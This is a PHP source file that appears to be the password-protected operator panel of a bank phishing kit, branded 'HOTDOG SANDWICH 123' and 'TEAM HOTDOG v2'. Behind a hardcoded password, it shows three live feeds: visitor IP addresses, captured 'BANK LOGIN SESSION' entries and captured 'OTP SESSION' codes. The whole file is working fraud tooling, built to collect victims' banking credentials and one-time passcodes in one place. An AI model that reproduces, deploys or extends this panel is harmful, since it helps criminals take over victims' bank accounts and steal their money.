<?php
/**
 * HOTDOG SANDWICH 123 by [BULDREG]
 * @version : 2.2
**/

$password = "siomai"; // Password 

session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit",-1);



$sessioncode = md5(__FILE__);
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    # _REQUEST mean _POST or _GET 
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    }
    else {
        print "<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form></pre>";
        exit;        
    }
}
?>
<style>
        BODY {
        background-color : black;
        }
        </style>
        
        <table border="2" style="width:100%">
        <br />
        <br />
        <br />
        <font color='white' size='4'><center><b>HOTDOG SANDWICH 123</b></center></font>
        <br />
        <br />
        <td><font color='white' size='2'><center><b>VISITORS IP</b></center></font></td></tr>
        <tr>
                <td style="height: 200px; width: 967px;"
           align="undefined" valign="undefined">
                    <iframe id="visit" src="visit.html" style="border-width:0" width=100% height=100% frameborder="0" scrolling="yes"></iframe>
                </td>
              </tr>
        </table>
        <table border="2" style="width:100%">
        <tr><td><font color='white' size='2'><center><b>BANK LOGIN SESSION</b></center></font></td><td><font color='white' size='2'><center><b>OTP SESSION</b></center></font></td></tr>
        <tr>
                <td style="height: 397px; width: 967px;"
           align="undefined" valign="undefined">
                    <iframe id="logs" src="logs.html" style="border-width:0" width=100% height=100% frameborder="0" scrolling="yes"></iframe>
                </td>
                <td style="height: 397px; width: 231px;"
           align="undefined" valign="undefined">       
                    <iframe id="otp" src="otp.html" style="border-width:0" width=100% height=100% frameborder="0" scrolling="yes"></iframe>
                </td>
              </tr>
              </table>
              <font color='red' size='3'><center><b>TEAM HOTDOG v2</b></center></font>